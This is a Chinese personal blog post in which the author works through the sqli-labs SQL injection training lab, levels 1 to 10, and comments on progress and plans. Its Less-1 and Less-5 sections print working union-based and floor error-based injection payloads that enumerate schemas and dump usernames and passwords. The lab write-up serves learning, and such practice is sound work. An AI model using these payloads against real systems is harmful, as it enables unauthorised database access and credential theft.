---
title: 一天日穿sqli-labs（伪）
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-09-08 20:34:28
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/867985.jpg
---
严格意义上讲今天还剩几小时了，所以明天继续。。。
之前打了一点sqli-labs，那个时候一知半解，就想着前进到下一关，也不知道自己写的是什么，所以sql注入的基础不太行。
今天从头开始重新挑战，借此机会希望能深入了解并掌握sql注入。

1、Less-1
单引号 
常规注入
http://bc61289b-8ad5-4c78-bce3-b9464ef5260c.node3.buuoj.cn/Less-1/?id=0%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+

2、Less-2
数字型，其他和上面一样

3、Less-3
('1')型，其他一样

4、Less-4
("1")型，其他一样

5、Less-5
报错注入，ez，extracvalue，启动！
Table 'security.flag' doesn't exist.......
一天日穿计划，失败。。。。
原因是我只会一个extractvalue，这里库非常多，而extractvalue的显示位数是有限制的，实际上只显示了一个security。
遇到了就来学习一下。
在这里我们使用floor报错语句进行注入：

通过floor报错
and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)
其中payload为你要插入的SQL语句
需要注意的是该语句将 输出字符长度限制为64个字符

?id=2' and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+

页面提示我输出信息超过一行，但我们已经使用了group_concat函数，说明这里数据库名组成的字符串长度超过了64位，所以我们需要放弃group_concat函数，而使用limit 0,1来一个个输出
group_concat()函数的作用：将返回信息拼接成一行显示
limit 0,1  表示输出第一个数据。   0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）
接着我们运用如下语句： 

and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+

改变 limit n,1 的n的值即可一个一个爆出

爆表：

and (select 1 from (select count(*),concat((select concat(table_name,';') from information_schema.tables where table_schema='security' limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a) --+

爆列：

and (select 1 from (select count(*),concat((select concat(column_name,';') from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+

爆用户名：

and(select 1 from (select count(*),concat((select concat(username,': ',password,';') from security.users limit 0,1),floor(rand()*2)) as x from security.users group by x) as a)--+

简直懒死了 今天看到了才想起来floor。。。。

6、Less-6
双引号

7、Less-7
忘了咋做了。。。。
其实这靶场设置的也不真实，比如说前面那个报错注入，输入id=1显示 youarein.....，那这数据库还有啥用。。。。
本关卡提示使用file权限向服务器写入文件

试了一下，一直报错，可能是我用的buu的环境？
反正不常用就跳过吧。

8、Less-8
二分法

9、Less-9
时间盲注

10、Less-10
双引号时间盲注

后面不想打了，这做起来感觉挺奇怪的。。没有ctf那感觉，还是多看看比赛题吧。

后面的计划是每天至少复习前面的五道题并且做一到两道新题，毕竟后面题开始难起来了，做快了也没用。